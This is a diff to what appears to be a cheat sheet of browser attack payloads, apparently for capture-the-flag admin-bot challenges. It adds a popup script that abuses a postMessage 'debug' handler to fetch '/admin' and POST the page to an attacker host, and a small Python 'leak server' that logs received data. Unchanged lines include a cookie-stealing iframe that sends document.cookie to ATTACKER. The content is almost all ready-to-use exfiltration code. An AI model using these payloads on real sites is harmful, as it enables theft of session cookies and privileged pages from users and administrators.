@@ -60,6 +60,35 @@ onmessage = e => fetch("https://ATTACKER/", {
 </script>
 ```
 
+Top-level popup for `SameSite=Lax` bot cookies:
+
+```html
+<script>
+const w = open("https://HOST/vulnerable")
+setInterval(() => {
+  w.postMessage({
+    type: "debug",
+    code: "fetch('/admin').then(r=>r.text()).then(t=>fetch('https://ATTACKER/',{method:'POST',body:t}))"
+  }, "*")
+}, 500)
+</script>
+```
+
+Tiny leak server:
+
+```python
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+class H(BaseHTTPRequestHandler):
+    def do_POST(self):
+        n = int(self.headers.get("content-length", "0"))
+        print(self.rfile.read(n).decode(errors="replace"), flush=True)
+        self.send_response(204)
+        self.end_headers()
+
+ThreadingHTTPServer(("0.0.0.0", 8000), H).serve_forever()
+```
+
 ## window.opener
 
 ```html
@@ -90,4 +119,3 @@ Top-level GET can still carry `SameSite=Lax` cookies.
 ```html
 <iframe sandbox="allow-scripts allow-forms allow-same-origin" srcdoc="<script>fetch('https://ATTACKER/?c='+document.cookie)</script>"></iframe>
 ```
-
